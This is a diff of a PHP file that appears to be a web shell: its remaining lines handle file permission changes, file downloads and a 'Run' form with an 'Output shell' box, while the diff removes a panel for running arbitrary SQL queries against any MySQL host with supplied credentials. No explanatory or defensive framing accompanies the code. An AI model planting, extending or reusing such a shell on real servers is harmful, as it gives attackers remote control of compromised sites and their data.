@@ -81,22 +81,7 @@
 		return "Perm fail";
 	}
 
-
-	function sql_query($host, $user, $passwd, $db="", $query){		
-		if(($res = mysqli_connect($host, $user, $passwd, $db)) != false){
-			if(($result = mysqli_query($res, $query)) != false){
-				return $result;			
-			}	
-			else
-				die("Error query: " . mysqli_error());
-			mysqli_close($res);
-		}
-		else
-			die("Error connect: " . mysqli_connect_error());
-		
-	}
 	
-		
 	if(isset($_POST['pm']) && ! empty($_POST['permfile']) && ! empty($_POST['perm']))
 		$res_perm = set_perm($_POST['permfile'], $_POST['perm']);
 		
@@ -130,11 +115,6 @@
 
 	if(isset($_POST['down']) && ! empty($_POST['load']))
 		download(trim($_POST['load'], " "));
-
-
-	if(isset($_POST['execute']))
-		$data = sql_query(trim($_POST['host']), trim($_POST['login']), trim($_POST['pass']), trim($_POST['db']), trim($_POST['q']));
-	clearstatcache();
 ?>
 
 
@@ -149,41 +129,6 @@
 					<input type="submit" value="Run" name="run"><br>
 					<label>Output shell</label><br>
 					<textarea rows="20" cols="100"><?php print_r($result); ?></textarea>
-				</form>
-			</div>
-
-			<div id="right">
-				<form method="POST">
-					<label><b>SQL</b></label><br>				
-					<input type="text" name="host" size="65" placeholder="Hostname" value= <?php echo $_POST['host']?> ><br>					
-					<input type="text" name="login" size="65" placeholder="Login" value= <?php echo $_POST['login']?> ><br>					
-					<input type="text" name="pass" size="65" placeholder="Password" value= <?php echo $_POST['pass']?> ><br>					
-					<input type="text" name="db" size="65" placeholder="Database name" value= <?php echo $_POST['db']?> ><br>
-					<textarea rows="5" cols="100" name="q" placeholder="Query"><?php echo $_POST['q']?> </textarea><br>
-					<input type="submit" value="Execute" name="execute"><br>
-					<label>Output query</label><br>
-					<div id="output">
-						<table border="1px">
-							<?php
-									$count = 0;
-									$columns = array();		
-									echo "<tr>";
-									while($col = mysqli_fetch_field($data)){
-										echo "<th> $col->name </th>";
-										$columns[$count] = $col->name;
-										$count++;
-									}	
-									echo "</tr>";
-									while($row = mysqli_fetch_assoc($data)){
-										echo "<tr>";																								
-										for($col = 0; $col < count($columns); $col++)
-											echo "<td align='center'>" . $row[$columns[$col]] . "</td>";
-										echo "</tr>";
-									}					
-									mysqli_free_result($data); 
-							?>
-						</table>
-					</div>
 				</form>
 			</div>
 		</div>
